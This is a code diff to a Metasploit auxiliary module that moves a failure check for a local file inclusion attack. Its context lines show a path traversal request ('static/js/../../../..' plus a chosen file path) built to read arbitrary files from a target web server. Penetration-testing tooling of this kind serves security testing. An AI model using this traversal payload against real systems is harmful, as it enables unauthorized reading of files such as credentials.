@@ -52,7 +52,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def lfi
-    fail_with(Failure::Unknown, 'FILEPATH required when ATTACK is LFI') unless datastore['FILEPATH']
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, "static/js/../../../../../../../../../../../../../..#{datastore['FILEPATH']}")
@@ -64,6 +63,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     @file_content ||= lfi
+    fail_with(Failure::Unknown, 'Failed to execute LFI') unless @file_content
     print_good("#{datastore['FILEPATH']}\n#{@file_content}")
   end
 
